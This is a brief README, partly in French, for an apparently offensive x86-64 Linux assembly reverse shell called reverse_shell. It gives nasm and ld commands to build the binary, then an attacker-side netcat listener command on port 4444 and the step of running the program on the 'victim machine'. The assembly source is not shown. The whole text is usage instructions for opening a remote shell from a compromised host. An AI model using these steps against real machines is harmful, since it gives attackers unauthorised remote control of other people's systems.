# reverse_shell
reverse shell (linux)

compilation : 
nasm -f elf64 reverse_shell.asm -o reverse_shell.o
ld reverse_shell.o -o reverse_shell


attaquant : nc -lvnp 4444
machine victime : ./reverse_shell
